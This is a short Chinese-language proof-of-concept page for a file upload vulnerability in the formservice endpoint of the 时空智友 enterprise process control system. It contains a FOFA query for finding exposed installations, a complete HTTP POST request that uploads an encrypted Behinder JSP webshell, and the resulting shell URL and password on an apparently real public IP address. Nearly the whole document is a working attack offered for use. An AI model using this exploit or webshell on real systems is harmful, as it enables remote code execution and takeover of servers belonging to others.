# 时空智友企业流程化管控系统 formservice 文件上传漏洞

    ## fofa

```
body="企业流程化管控系统" && body="密码(Password):"
```



## poc

```
POST /formservice?service=attachment.write&isattach=false&filename=C4fD6D7DCb9B199a.jsp HTTP/1.1
Host: 106.14.45.41:8102
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
Content-Length: 533

<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
```

WebShell URL: https://106.14.45.41:8102/form/temp/202308110mil4t7y6wdq7eu6_C4fD6D7DCb9B199a.jsp
Password: rebeyond
WebShell tool: Behinder v3.0
Webshell type: jsp
